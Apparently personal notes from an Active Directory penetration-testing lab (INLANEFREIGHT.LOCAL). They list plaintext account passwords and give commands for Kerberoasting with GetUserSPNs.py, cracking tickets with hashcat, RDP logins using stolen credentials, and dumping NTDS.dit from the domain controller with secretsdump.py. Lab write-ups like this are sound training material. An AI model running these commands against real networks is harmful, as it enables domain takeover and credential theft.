administrator:Welcome123!
asmith:Welcome1
dhawkins:Bacon1989 (ASREPRoastable)

Kerberoastable
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/dhawkins -request
```

Crack Kerberos Ticket offline
```shell-session
hashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

RDP into DEV01 with administrator:Welcome123!

RDP into Domain Controller with solarwindsmonitor:Solar1010

Dump NTDS file
```shell-session
secretsdump.py -just-dc -system SYSTEM -ntds NTDS.dit INLANEFREIGHT.LOCAL/solarwindsmonitor:Solar1010@172.16.5.5
```

Local group
```shell-session
net user svc_reporting
```
